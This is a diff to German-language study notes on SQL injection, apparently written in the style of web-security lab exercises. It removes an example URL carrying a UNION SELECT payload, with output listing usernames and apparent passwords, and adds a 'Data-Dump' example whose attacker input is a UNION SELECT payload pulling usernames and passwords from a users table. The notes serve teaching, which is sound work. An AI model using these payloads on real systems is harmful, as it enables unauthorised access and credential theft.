@@ -42,12 +42,9 @@ select title, cost from product where id =1 UNION SELECT NULL --
  ```
  
 # Beispiele
+## Data-Dump
 ```sql
-// Input
-www.random.com/app.php?id =' UNION SELECT username, password FROM users \--
-// Output
-carlos
-asdklsdf
-administrator
-asjklhnöshf
+SELECT name, description FROM products WHERE category = 'Gifts'
+// Attacker
+' UNION SELECT username, password FROM users-- 
 ```
